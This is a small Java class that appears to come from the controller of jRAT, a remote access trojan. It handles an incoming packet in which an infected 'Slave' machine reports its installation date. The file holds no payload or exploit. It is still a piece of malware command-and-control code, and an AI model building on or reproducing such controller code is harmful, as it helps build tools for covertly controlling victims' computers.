package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet11InitInstallationDate extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}
